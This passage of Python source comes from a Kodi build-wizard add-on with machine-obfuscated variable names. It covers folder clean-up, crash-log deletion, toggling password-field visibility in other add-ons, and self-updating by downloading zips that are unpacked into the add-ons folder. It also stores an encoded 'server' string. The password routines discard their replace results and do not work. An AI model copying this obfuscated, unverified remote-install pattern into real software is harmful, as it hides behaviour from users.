    OOOOO000O00O00OO0 =DIALOG .select ("%s: Select the items to remove from 'MyBuilds'."%ADDONTITLE ,OO000O00O00O000O0 )#line:1307
    if OOOOO000O00O00OO0 ==-1 :#line:1309
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clean Up Cancelled![/COLOR]"%COLOR2 )#line:1310
    elif OOOOO000O00O00OO0 ==0 :#line:1311
        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to clean up all items in your 'My_Builds' folder?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,MYBUILDS ),yeslabel ="[B][COLOR green]Clean Up[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1312
            O00000000OO00OO0O ,OOOO0OO0OO0O000O0 =cleanHouse (translatepath (MYBUILDS ))#line:1313
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Removed Files: [COLOR %s]%s[/COLOR] / Folders:[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,O00000000OO00OO0O ,COLOR1 ,OOOO0OO0OO0O000O0 ))#line:1314
        else :#line:1315
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clean Up Cancelled![/COLOR]"%COLOR2 )#line:1316
    else :#line:1317
        OO0O0OOO0O0OOOOOO =O0OOOO000OOO0O000 [OOOOO000O00O00OO0 -1 ];OO000000000OO0OO0 =False #line:1318
        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove [COLOR %s]%s[/COLOR] from 'My_Builds' folder?[/COLOR]"%(COLOR2 ,COLOR1 ,OO000O00O00O000O0 [OOOOO000O00O00OO0 ]),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OOO0O0OOOOOO ),yeslabel ="[B][COLOR green]Clean Up[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1319
            if os .path .isfile (OO0O0OOO0O0OOOOOO ):#line:1320
                try :#line:1321
                    os .remove (OO0O0OOO0O0OOOOOO )#line:1322
                    OO000000000OO0OO0 =True #line:1323
                except :#line:1324
                    log ("Unable to remove: %s"%OO0O0OOO0O0OOOOOO )#line:1325
            else :#line:1326
                cleanHouse (OO0O0OOO0O0OOOOOO )#line:1327
                try :#line:1328
                    shutil .rmtree (OO0O0OOO0O0OOOOOO )#line:1329
                    OO000000000OO0OO0 =True #line:1330
                except Exception as O000OOO000OO00O0O :#line:1331
                    log ("Error removing %s"%OO0O0OOO0O0OOOOOO ,5 )#line:1332
            if OO000000000OO0OO0 :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed![/COLOR]"%(COLOR2 ,OO000O00O00O000O0 [OOOOO000O00O00OO0 ]))#line:1333
            else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Error Removing %s![/COLOR]"%(COLOR2 ,OO000O00O00O000O0 [OOOOO000O00O00OO0 ]))#line:1334
        else :#line:1335
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clean Up Cancelled![/COLOR]"%COLOR2 )#line:1336
def getCond (O0O0OOOOOOOO0OO0O ):#line:1338
    return xbmc .getCondVisibility (O0O0OOOOOOOO0OO0O )#line:1339
def ebi (OO0OO00OO00OO0O00 ):#line:1341
    xbmc .executebuiltin (OO0OO00OO00OO0O00 )#line:1342
def refresh ():#line:1344
    ebi ('Container.Refresh()')#line:1345
def splitNotify (OO000000OO000O0O0 ):#line:1347
    OOO0000OO0000O000 =openURL (OO000000OO000O0O0 ).replace ('\r','').replace ('\t','').replace ('\n','[CR]')#line:1348
    if OOO0000OO0000O000 .find ('|||')==-1 :return False ,False #line:1349
    O0O0OO0000O0O0O0O ,OO00O0O00OOOOO00O =OOO0000OO0000O000 .split ('|||')#line:1350
    if OO00O0O00OOOOO00O .startswith ('[CR]'):OO00O0O00OOOOO00O =OO00O0O00OOOOO00O [4 :]#line:1351
    return O0O0OO0000O0O0O0O .replace ('[CR]',''),OO00O0O00OOOOO00O #line:1352
def forceUpdate (silent =False ):#line:1354
    ebi ('UpdateAddonRepos()')#line:1355
    ebi ('UpdateLocalAddons()')#line:1356
def convertSpecial (O0OO0OO0O0O0OO0O0 ,over =False ):#line:1360
    OO0OOO00OOOO0O0O0 =fileCount (O0OO0OO0O0O0OO0O0 );OO0OOOO0O00000000 =0 #line:1361
    DP .create (ADDONTITLE ,"[COLOR %s]Changing Physical Paths To Special"%COLOR2 ,"","Please Wait[/COLOR]")#line:1362
    for OO0OOOOOOOOOOOO00 ,OO00OO00OOO0O0OO0 ,OO00OOOO000O000O0 in os .walk (O0OO0OO0O0O0OO0O0 ):#line:1363
        for OO000O0000O000O00 in OO00OOOO000O000O0 :#line:1364
            OO0OOOO0O00000000 +=1 #line:1365
            O0OOOO0OO000O0OOO =int (percentage (OO0OOOO0O00000000 ,OO0OOO00OOOO0O0O0 ))#line:1366
            if OO000O0000O000O00 .endswith (".xml")or OO000O0000O000O00 .endswith (".hash")or OO000O0000O000O00 .endswith ("properies"):#line:1367
                DP .update (O0OOOO0OO000O0OOO ,"[COLOR %s]Scanning: [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,OO0OOOOOOOOOOOO00 .replace (HOME ,'')),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000O0000O000O00 ),"Please Wait[/COLOR]")#line:1368
                O00O0O0O00O0O000O =open (os .path .join (OO0OOOOOOOOOOOO00 ,OO000O0000O000O00 )).read ()#line:1369
                OOOO0000OO00O0O00 =urllib .quote (HOME )#line:1370
                OO0O0O0OO0OO000OO =urllib .quote (HOME ).replace ('%3A','%3a').replace ('%5C','%5c')#line:1371
                OOOOOO0OO000OO0O0 =O00O0O0O00O0O000O .replace (HOME ,'special://home/').replace (OOOO0000OO00O0O00 ,'special://home/').replace (OO0O0O0OO0OO000OO ,'special://home/')#line:1372
                O0OO00OO00O00OOOO =open ((os .path .join (OO0OOOOOOOOOOOO00 ,OO000O0000O000O00 )),mode ='w')#line:1373
                O0OO00OO00O00OOOO .write (str (OOOOOO0OO000OO0O0 ))#line:1374
                O0OO00OO00O00OOOO .close ()#line:1375
    DP .close ()#line:1376
    log ("[Convert Paths to Special] Complete",5 )#line:1377
    if over ==False :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Convert Paths to Special: Complete![/COLOR]"%COLOR2 )#line:1378
def clearCrash ():#line:1380
    OOO0000OO000OO0O0 =[]#line:1381
    for O0000OOOOO0O0OO00 in glob .glob (os .path .join (LOG ,'*crashlog*.*')):#line:1382
        OOO0000OO000OO0O0 .append (O0000OOOOO0O0OO00 )#line:1383
    if len (OOO0000OO000OO0O0 )>0 :#line:1384
        if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the Crash logs?'%COLOR2 ,'[COLOR %s]%s[/COLOR] Files Found[/COLOR]'%(COLOR1 ,len (OOO0000OO000OO0O0 )),yeslabel ="[B][COLOR green]Remove Logs[/COLOR][/B]",nolabel ="[B][COLOR red]Keep Logs[/COLOR][/B]"):#line:1385
            for O00O00000O0OO00OO in OOO0000OO000OO0O0 :#line:1386
                os .remove (O00O00000O0OO00OO )#line:1387
            LogNotify ('[COLOR %s]Clear Crash Logs[/COLOR]'%COLOR1 ,'[COLOR %s]%s Crash Logs Removed[/COLOR]'%(COLOR2 ,len (OOO0000OO000OO0O0 )))#line:1388
        else :LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Crash Logs Cancelled[/COLOR]'%COLOR2 )#line:1389
    else :LogNotify ('[COLOR %s]Clear Crash Logs[/COLOR]'%COLOR1 ,'[COLOR %s]No Crash Logs Found[/COLOR]'%COLOR2 )#line:1390
def hidePassword ():#line:1392
    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]hide[/COLOR] all passwords when typing in the add-on settings menus?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Hide Passwords[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1393
        O000OOOO00000O00O =0 #line:1394
        for OOOOOOOO0OO00O0OO in glob .glob (os .path .join (ADDONS ,'*/')):#line:1395
            OO000O00OOOO000O0 =os .path .join (OOOOOOOO0OO00O0OO ,'resources','settings.xml')#line:1396
            if os .path .exists (OO000O00OOOO000O0 ):#line:1397
                O0OO00000OOOO0O00 =open (OO000O00OOOO000O0 ).read ()#line:1398
                O000O0OOO0OO00O00 =parseDOM (O0OO00000OOOO0O00 ,'addon',ret ='id')#line:1399
                for OO00O0O0O0O00O000 in O000O0OOO0OO00O00 :#line:1400
                    if 'pass'in OO00O0O0O0O00O000 :#line:1401
                        if not 'option="hidden"'in OO00O0O0O0O00O000 :#line:1402
                            try :#line:1403
                                O0OOO0O000OOOO00O =OO00O0O0O0O00O000 .replace ('/','option="hidden" /')#line:1404
                                O0OO00000OOOO0O00 .replace (OO00O0O0O0O00O000 ,O0OOO0O000OOOO00O )#line:1405
                                O000OOOO00000O00O +=1 #line:1406
                                log ("[Hide Passwords] found in %s on %s"%(OO000O00OOOO000O0 .replace (HOME ,''),OO00O0O0O0O00O000 ),5 )#line:1407
                            except :#line:1408
                                pass #line:1409
                OOO00OO00OOOO000O =open (OO000O00OOOO000O0 ,mode ='w');OOO00OO00OOOO000O .write (O0OO00000OOOO0O00 );OOO00OO00OOOO000O .close ()#line:1410
        LogNotify ("[COLOR %s]Hide Passwords[/COLOR]"%COLOR1 ,"[COLOR %s]%s items changed[/COLOR]"%(COLOR2 ,O000OOOO00000O00O ))#line:1411
        log ("[Hide Passwords] %s items changed"%O000OOOO00000O00O ,5 )#line:1412
    else :log ("[Hide Passwords] Cancelled",5 )#line:1413
def unhidePassword ():#line:1415
    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]unhide[/COLOR] all passwords when typing in the add-on settings menus?[/COLOR]"%(COLOR2 ,COLOR1 ),yeslabel ="[B][COLOR green]Unhide Passwords[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1416
        O0O00OOO00000O000 =0 #line:1417
        for OOOOOOO0000000OOO in glob .glob (os .path .join (ADDONS ,'*/')):#line:1418
            O0000000OO000OO0O =os .path .join (OOOOOOO0000000OOO ,'resources','settings.xml')#line:1419
            if os .path .exists (O0000000OO000OO0O ):#line:1420
                OO0O0OOO000OOO00O =open (O0000000OO000OO0O ).read ()#line:1421
                O00OOOO00OO000000 =parseDOM (OO0O0OOO000OOO00O ,'addon',ret ='id')#line:1422
                for OO00O0OOO0O0000OO in O00OOOO00OO000000 :#line:1423
                    if 'pass'in OO00O0OOO0O0000OO :#line:1424
                        if 'option="hidden"'in OO00O0OOO0O0000OO :#line:1425
                            try :#line:1426
                                O0OO0000O00OO0O0O =OO00O0OOO0O0000OO .replace ('option="hidden"','')#line:1427
                                OO0O0OOO000OOO00O .replace (OO00O0OOO0O0000OO ,O0OO0000O00OO0O0O )#line:1428
                                O0O00OOO00000O000 +=1 #line:1429
                                log ("[Unhide Passwords] found in %s on %s"%(O0000000OO000OO0O .replace (HOME ,''),OO00O0OOO0O0000OO ),5 )#line:1430
                            except :#line:1431
                                pass #line:1432
                O0O0OOOOOO00OO0O0 =open (O0000000OO000OO0O ,mode ='w');O0O0OOOOOO00OO0O0 .write (OO0O0OOO000OOO00O );O0O0OOOOOO00OO0O0 .close ()#line:1433
        LogNotify ("[COLOR %s]Unhide Passwords[/COLOR]"%COLOR1 ,"[COLOR %s]%s items changed[/COLOR]"%(COLOR2 ,O0O00OOO00000O000 ))#line:1434
        log ("[Unhide Passwords] %s items changed"%O0O00OOO00000O000 ,5 )#line:1435
    else :log ("[Unhide Passwords] Cancelled",5 )#line:1436
def chunk_report (OO0OOO0O000O0O00O ,O0O0000OOOOOOO000 ,OOOO0OOOO000OO000 ):#line:1437
   OOO0OOO0O0O0000O0 =float (OO0OOO0O000O0O00O )/OOOO0OOOO000OO000 #line:1438
   OOO0OOO0O0O0000O0 =round (OOO0OOO0O0O0000O0 *100 ,2 )#line:1439
   if OO0OOO0O000O0O00O >=OOOO0OOOO000OO000 :#line:1441
      sys .stdout .write ('\n')#line:1442
def chunk_read (O000OO0O0OOO0O00O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:1444
   import time #line:1445
   O00000000O00O0OOO =100 #line:1446
   OO0OOO000000O00O0 =0 #line:1448
   OOOO00OO00OOO0O0O =time .time ()#line:1449
   O00OO0O00O0O0O0O0 =0 #line:1450
   with open (destination ,"wb")as O000OOOOO0000O00O :#line:1453
    while 1 :#line:1454
      O00OO0O00O00O000O =time .time ()-OOOO00OO00OOO0O0O #line:1455
      OO00OO00OOO0OOOOO =int (O00OO0O00O0O0O0O0 *chunk_size )#line:1456
      O000OO0O00OOO00O0 =O000OO0O0OOO0O00O .read (chunk_size )#line:1457
      O000OOOOO0000O00O .write (O000OO0O00OOO00O0 )#line:1458
      O000OOOOO0000O00O .flush ()#line:1459
      OO0OOO000000O00O0 +=len (O000OO0O00OOO00O0 )#line:1460
      O0O0OO00O0O0OO0OO =float (OO0OOO000000O00O0 )/O00000000O00O0OOO #line:1461
      O0O0OO00O0O0OO0OO =round (O0O0OO00O0O0OO0OO *100 ,2 )#line:1462
      if int (O00OO0O00O00O000O )>0 :#line:1463
        O0O0O00O00O0OO0OO =int (OO00OO00OOO0OOOOO /(1024 *O00OO0O00O00O000O ))#line:1464
      else :#line:1465
         O0O0O00O00O0OO0OO =0 #line:1466
      if O0O0O00O00O0OO0OO >1024 and not O0O0OO00O0O0OO0OO ==100 :#line:1467
          OO00O00000OOO0000 =int (((O00000000O00O0OOO -OO00OO00OOO0OOOOO )/1024 )/(O0O0O00O00O0OO0OO ))#line:1468
      else :#line:1469
          OO00O00000OOO0000 =0 #line:1470
      if OO00O00000OOO0000 <0 :#line:1471
        OO00O00000OOO0000 =0 #line:1472
      dp .update (int (O0O0OO00O0O0OO0OO ),"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O0OO00O0O0OO0OO ,OO00OO00OOO0OOOOO /(1024 *1024 ),O00000000O00O0OOO /(1000 *1000 ),O0O0O00O00O0OO0OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO00O00000OOO0000 ,60 ))#line:1473
      if dp .iscanceled ():#line:1474
         dp .close ()#line:1475
         break #line:1476
      if not O000OO0O00OOO00O0 :#line:1477
         break #line:1478
      if report_hook :#line:1480
         report_hook (OO0OOO000000O00O0 ,chunk_size ,O00000000O00O0OOO )#line:1481
      O00OO0O00O0O0O0O0 +=1 #line:1482
   return OO0OOO000000O00O0 #line:1484
server ='&eJzLKCkpKLbS10_JTM8s0StOTU3JyC8u0Ust1c_OT8nUL8-sSixK0S-pKNFPyklMztaryM0BAPI5E0I=$'#line:1485
def googledrive_download (O0000OOO00OO0O000 ,O0OOO0O0O0O00O000 ,O00OOO0OO00OOO00O ,OO000OOO00O0OOO00 ):#line:1486
    O00000OOO0OO0OOOO =[]#line:1490
    OO000OO0O00000O00 =O0000OOO00OO0O000 .split ('=')#line:1491
    O0000OOO00OO0O000 =OO000OO0O00000O00 [len (OO000OO0O00000O00 )-1 ]#line:1492
    def O0O00000O000O0OO0 (OOO0OO00000OO00OO ):#line:1494
        for OO00OOOO0O000O0OO in OOO0OO00000OO00OO :#line:1496
            OOOOO0O0OO0OOOOOO =OO00OOOO0O000O0OO .value #line:1499
            if 'download_warning'in OO00OOOO0O000O0OO .name :#line:1500
                return OO00OOOO0O000O0OO .value #line:1503
            return OOOOO0O0OO0OOOOOO #line:1504
        return None #line:1506
    def O00O0OOOO0000OOOO (OOO0OO00OOO0000O0 ,OO0O000O000OO000O ):#line:1508
        OOOO00O0O000OOO0O =32768 #line:1510
        O00O000O000O00O0O =time .time ()#line:1511
        with open (OO0O000O000OO000O ,"wb")as O0O00OO0O0O000OOO :#line:1513
            O000OO00O00OO00OO =1 #line:1514
            O0O0O0OOO0O000OO0 =32768 #line:1515
            try :#line:1516
                O0O0OOO0OOOOO0OOO =int (OOO0OO00OOO0000O0 .headers .get ('content-length'))#line:1517
                print ('file total size :',O0O0OOO0OOOOO0OOO )#line:1518
            except TypeError :#line:1519
                print ('using dummy length !!!')#line:1520
                O0O0OOO0OOOOO0OOO =int (OO000OOO00O0OOO00 )*1000000 #line:1521
            for OOO0O0OOOO000OO00 in OOO0OO00OOO0000O0 .iter_content (OOOO00O0O000OOO0O ):#line:1522
                if OOO0O0OOOO000OO00 :#line:1523
                    O0O00OO0O0O000OOO .write (OOO0O0OOOO000OO00 )#line:1524
                    O0O00OO0O0O000OOO .flush ()#line:1525
                    O0OOOO00OO0OO0O00 =time .time ()-O00O000O000O00O0O #line:1526
                    O000O0OO00000000O =int (O000OO00O00OO00OO *O0O0O0OOO0O000OO0 )#line:1527
                    if O0OOOO00OO0OO0O00 ==0 :#line:1528
                        O0OOOO00OO0OO0O00 =0.1 #line:1529
                    OOO00O0OOOOOO0OO0 =int (O000O0OO00000000O /(1024 *O0OOOO00OO0OO0O00 ))#line:1530
                    O000O0OO0O0O00O0O =int (O000OO00O00OO00OO *O0O0O0OOO0O000OO0 *100 /O0O0OOO0OOOOO0OOO )#line:1531
                    if OOO00O0OOOOOO0OO0 >1024 and not O000O0OO0O0O00O0O ==100 :#line:1532
                      OOO000O00OO0000O0 =int (((O0O0OOO0OOOOO0OOO -O000O0OO00000000O )/1024 )/(OOO00O0OOOOOO0OO0 ))#line:1533
                    else :#line:1534
                      OOO000O00OO0000O0 =0 #line:1535
                    O00OOO0OO00OOO00O .update (int (O000O0OO0O0O00O0O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O000O0OO0O0O00O0O ,O000O0OO00000000O /(1024 *1024 ),O0O0OOO0OOOOO0OOO /(1000 *1000 ),OOO00O0OOOOOO0OO0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOO000O00OO0000O0 ,60 ))#line:1537
                    O000OO00O00OO00OO +=1 #line:1538
                    if O00OOO0OO00OOO00O .iscanceled ():#line:1539
                     O00OOO0OO00OOO00O .close ()#line:1540
                     break #line:1541
    O000OOOO00O0OO0O0 ="https://docs.google.com/uc?export=download"#line:1542
    import urllib2 #line:1547
    import cookielib #line:1548
    from cookielib import CookieJar #line:1550
    OO0000O00O0OOOO00 =CookieJar ()#line:1552
    OO0O00O0O000OOO00 =build_opener (HTTPCookieProcessor (OO0000O00O0OOOO00 ))#line:1553
    OOO0OO00000O0OOOO ={'id':O0000OOO00OO0O000 }#line:1555
    OOOOO0OOO0O000OO0 =urllib .urlencode (OOO0OO00000O0OOOO )#line:1556
    O0O0OO0O0O0O00000 =OO0O00O0O000OOO00 .open (O000OOOO00O0OO0O0 +'&'+OOOOO0OOO0O000OO0 )#line:1558
    OO00O0O0O0000OO00 =O0O0OO0O0O0O00000 .read ()#line:1559
    O0O00OOO00O0000OO =O0O00000O000O0OO0 (OO0000O00O0OOOO00 )#line:1563
    if O0O00OOO00O0000OO :#line:1565
        OOOOOO00OOO000O0O ={'id':O0000OOO00OO0O000 ,'confirm':O0O00OOO00O0000OO }#line:1566
        O0O0O00OO0OO00O0O ={'Access-Control-Allow-Headers':'Content-Length'}#line:1567
        OOOOO0OOO0O000OO0 =urllib .urlencode (OOOOOO00OOO000O0O )#line:1568
        O0O0OO0O0O0O00000 =OO0O00O0O000OOO00 .open (O000OOOO00O0OO0O0 +'&'+OOOOO0OOO0O000OO0 )#line:1569
        chunk_read (O0O0OO0O0O0O00000 ,report_hook =chunk_report ,dp =O00OOO0OO00OOO00O ,destination =O0OOO0O0O0O00O000 ,filesize =OO000OOO00O0OOO00 )#line:1570
    return (O00000OOO0OO0OOOO )#line:1574
def resetkodi ():#line:1575
        if xbmc .getCondVisibility ('system.platform.windows'):#line:1576
            OO0O0000O000O0OO0 =xbmcgui .DialogProgress ()#line:1577
            try :#line:1578
                OO0O0000O000O0OO0 .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות",'',"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:1580
            except :#line:1581
                OO0O0000O000O0OO0 .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות"+'\n'+''+'\n'+"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:1583
            OO0O0000O000O0OO0 .update (0 )#line:1584
            for OOOO00O000O00OO0O in range (5 ,-1 ,-1 ):#line:1585
                time .sleep (1 )#line:1586
                try :#line:1587
                    OO0O0000O000O0OO0 .update (int ((5 -OOOO00O000O00OO0O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OOOO00O000O00OO0O ),'')#line:1588
                except :#line:1589
                    OO0O0000O000O0OO0 .update (int ((5 -OOOO00O000O00OO0O )/5.0 *100 ),"ההתקנה תסגר"+'\n'+'בעוד {0} שניות'.format (OOOO00O000O00OO0O )+'\n'+'[COLOR yellow][B]ההתקנה הושלמה - Anonymous TV[/B][/COLOR]')#line:1590
                if OO0O0000O000O0OO0 .iscanceled ():#line:1591
                    from resources .libs import win #line:1592
                    return None ,None #line:1593
            from resources .libs import win #line:1594
        else :#line:1595
            OO0O0000O000O0OO0 =xbmcgui .DialogProgress ()#line:1596
            try :#line:1597
                OO0O0000O000O0OO0 .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות",'',"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:1599
            except :#line:1600
                OO0O0000O000O0OO0 .create ("להשלמת הפעולה הקודי יסגר","אנא המתן 5 שניות"+'\n'+''+'\n'+"[COLOR yellow][B]הויזארד עודכן בהצלחה![/B][/COLOR]")#line:1602
            OO0O0000O000O0OO0 .update (0 )#line:1603
            for OOOO00O000O00OO0O in range (5 ,-1 ,-1 ):#line:1604
                time .sleep (1 )#line:1605
                try :#line:1606
                    OO0O0000O000O0OO0 .update (int ((5 -OOOO00O000O00OO0O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OOOO00O000O00OO0O ),'')#line:1607
                except :#line:1608
                    OO0O0000O000O0OO0 .update (int ((5 -OOOO00O000O00OO0O )/5.0 *100 ),"ההתקנה תסגר"+'\n'+'בעוד {0} שניות'.format (OOOO00O000O00OO0O )+'\n'+'')#line:1609
                if OO0O0000O000O0OO0 .iscanceled ():#line:1610
                    from resources .libs import android #line:1612
                    return None ,None #line:1613
            from resources .libs import android #line:1614
def wizardUpdate (startup =None ):#line:1617
    if not xbmc .Player ().isPlaying ():#line:1618
        if workingURL (WIZARDFILE ):#line:1619
            O0OOO0OOOO00OOO00 =checkWizard ('version')#line:1620
            OOOO0OOO000OO0OOO =checkWizard ('zip')#line:1621
            if O0OOO0OOOO00OOO00 !=False and str (O0OOO0OOOO00OOO00 )>str (VERSION ):#line:1624
                O0OOO0O0OO00OO00O =os .path .join (PACKAGES ,'%s-%s.zip'%(ADDON_ID ,str (O0OOO0OOOO00OOO00 )))#line:1626
                try :os .remove (O0OOO0O0OO00OO00O )#line:1627
                except :pass #line:1628
                if 'google'in OOOO0OOO000OO0OOO :#line:1629
                    O0OOO0OOOOO0O0000 =googledrive_download (OOOO0OOO000OO0OOO ,O0OOO0O0OO00OO00O ,DP2 ,checkWizard ('filesize'))#line:1630
                else :#line:1631
                    downloaderwiz .download4 (OOOO0OOO000OO0OOO ,O0OOO0O0OO00OO00O ,DP2 )#line:1632
                xbmc .sleep (1000 )#line:1633
                DP2 .create ('מתקין')#line:1634
                DP2 .update (100 ,message ='אנא המתן ...')#line:1635
                extract .all (O0OOO0O0OO00OO00O ,ADDONS )#line:1636
                DP2 .close ()#line:1637
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הויזארד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:1639
                log ("[Auto Update Wizard] Wizard updated to v%s"%str (O0OOO0OOOO00OOO00 ),5 )#line:1640
                return #line:1642
            else :#line:1643
                if not startup :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No New Version of Wizard[/COLOR]"%COLOR2 )#line:1644
                log ("[Auto Update Wizard] No New Version v%s"%str (O0OOO0OOOO00OOO00 ),5 )#line:1645
        else :log ("[Auto Update Wizard] Url for wizard file not valid: %s"%WIZARDFILE ,5 )#line:1646
def wizardUpdateDP (startup =None ):#line:1648
    if workingURL (WIZARDFILE ):#line:1649
        OO0OOOOO00000O0OO =checkWizard ('version')#line:1650
        OO0OOOO0OOO0OOO0O =checkWizard ('zip')#line:1651
        if OO0OOOOO00000O0OO !=False and str (OO0OOOOO00000O0OO )>str (VERSION ):#line:1652
            log ("[Auto Update Wizard] Installing wizard v%s"%str (OO0OOOOO00000O0OO ),5 )#line:1655
            DP .create (ADDONTITLE ,'[COLOR %s]מוריד גירסה חדשה יותר של Wizard'%COLOR2 +'\n'+''+'\n'+'אנא המתן[/COLOR]')#line:1657
            OOOO000OO0O0000O0 =os .path .join (PACKAGES ,'%s-%s.zip'%(ADDON_ID ,str (OO0OOOOO00000O0OO )))#line:1658
            try :os .remove (OOOO000OO0O0000O0 )#line:1659
            except :pass #line:1660
            if 'google'in OO0OOOO0OOO0OOO0O :#line:1661
                O0O00OOO00O0O000O =googledrive_download (OO0OOOO0OOO0OOO0O ,OOOO000OO0O0000O0 ,DP ,checkWizard ('filesize'))#line:1662
            downloader .download (OO0OOOO0OOO0OOO0O ,OOOO000OO0O0000O0 ,DP )#line:1663
            xbmc .sleep (1000 )#line:1664
            DP .update (0 ,"Installing %s update"%ADDONTITLE )#line:1666
            OO0O0OOOO00OO0OOO ,O0OOOO00O0OO0O0O0 ,OO00OO000O0OOOOO0 =extract .all (OOOO000OO0O0000O0 ,ADDONS ,DP ,True )#line:1667
            DP .close ()#line:1668
            resetkodi ()#line:1669
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הויזארד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:1670
            return #line:1672
        else :#line:1673
            if not startup :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No New Version of Wizard[/COLOR]"%COLOR2 )#line:1674
            log ("[Auto Update Wizard] No New Version v%s"%str (OO0OOOOO00000O0OO ),5 )#line:1675
    else :log ("[Auto Update Wizard] Url for wizard file not valid: %s"%WIZARDFILE ,5 )#line:1676
def convertText ():#line:1678
    OOO00OO000000OOOO =os .path .join (ADDONDATA ,'TextFiles')#line:1679
    if not os .path .exists (OOO00OO000000OOOO ):os .makedirs (OOO00OO000000OOOO )#line:1680
    DP .create (ADDONTITLE ,'[COLOR %s][B]Converting Text:[/B][/COLOR]'%(COLOR2 ),'','Please Wait')#line:1682
    if not ld (BL )=='http://':#line:1684
        O000O0OO0000O00OO =os .path .join (OOO00OO000000OOOO ,'builds.txt')#line:1685
        O0O0O00OO0O0OOOOO ='';O0OOOOO0000O000OO =0 #line:1686
        O0O0OOOO00O000O0O =openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','')#line:1687
        DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]Builds.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:1688
        if WIZARDFILE ==ld (BL ):#line:1689
            try :#line:1690
                O00O0OOO0000OO000 ,O000000O00O00OO00 ,O0OOOOO00OOOO0O0O =checkWizard ('all')#line:1691
                O0O0O00OO0O0OOOOO ='id="%s"\n'%O00O0OOO0000OO000 #line:1692
                O0O0O00OO0O0OOOOO +='version="%s"\n'%O000000O00O00OO00 #line:1693
                O0O0O00OO0O0OOOOO +='zip="%s"\n'%O0OOOOO00OOOO0O0O #line:1694
            except :#line:1695
                pass #line:1696
        O000O0OO0OO000OOO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)"').findall (O0O0OOOO00O000O0O )#line:1697
        O0O0000000000O0OO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0OOOO00O000O0O )#line:1698
        if len (O0O0000000000O0OO )==0 :#line:1699
            for OOOO0OOOO000O000O ,O000000O00O00OO00 ,O0OOOOO00OOOO0O0O ,O0OO00OO0OO0OO000 ,O0OOO0OOO00O0O000 ,O0OO0OOO00OOOOOO0 ,OO000O0O0O0O00OOO ,O00O000OO0O0000O0 in O000O0OO0OO000OOO :#line:1700
                O0OOOOO0000O000OO +=1 #line:1701
                DP .update (int (percentage (O0OOOOO0000O000OO ,len (O0O0000000000O0OO ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOOO000O000O ))#line:1702
                if not O0O0O00OO0O0OOOOO =='':O0O0O00OO0O0OOOOO +='\n'#line:1703
                O0O0O00OO0O0OOOOO +='name="%s"\n'%OOOO0OOOO000O000O #line:1704
